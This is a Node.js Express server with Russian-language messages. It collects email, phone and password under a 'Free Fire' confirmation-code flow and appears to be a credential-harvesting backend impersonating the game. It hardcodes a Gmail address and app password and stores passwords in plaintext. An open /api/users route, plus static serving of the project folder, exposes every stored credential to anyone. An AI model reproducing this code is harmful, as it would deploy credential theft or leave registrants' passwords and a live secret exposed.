const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static(__dirname));

const USERS_FILE = path.join(__dirname, 'users.json');

if (!fs.existsSync(USERS_FILE)) {
    fs.writeFileSync(USERS_FILE, JSON.stringify([]));
}

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'azizkarimovff33@gmail.com',
        pass: 'siut xkmz jsmd afuu'
    }
});

const codes = {};

app.post('/api/register', (req, res) => {
    const { email, phone, password } = req.body;

    if (!email || !phone || !password) {
        return res.status(400).json({ error: 'Все поля обязательны' });
    }

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    codes[email] = { code, phone, password, timestamp: new Date().toISOString() };

    transporter.sendMail({
        from: 'azizkarimovff33@gmail.com',
        to: email,
        subject: 'Код подтверждения Free Fire',
        text: `Ваш код подтверждения: ${code}`
    }, (error) => {
        if (error) {
            console.log(error);
            return res.status(500).json({ error: 'Ошибка отправки email' });
        }
        res.json({ message: 'Код отправлен' });
    });
});

app.post('/api/verify', (req, res) => {
    const { email, code } = req.body;

    if (!codes[email] || codes[email].code !== code) {
        return res.status(400).json({ error: 'Неверный код' });
    }

    const { phone, password, timestamp } = codes[email];
    const users = JSON.parse(fs.readFileSync(USERS_FILE));
    users.push({ email, phone, password, timestamp });
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));

    delete codes[email];
    res.json({ message: 'Успешная регистрация' });
});

app.get('/api/users', (req, res) => {
    const users = JSON.parse(fs.readFileSync(USERS_FILE));
    res.json(users);
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});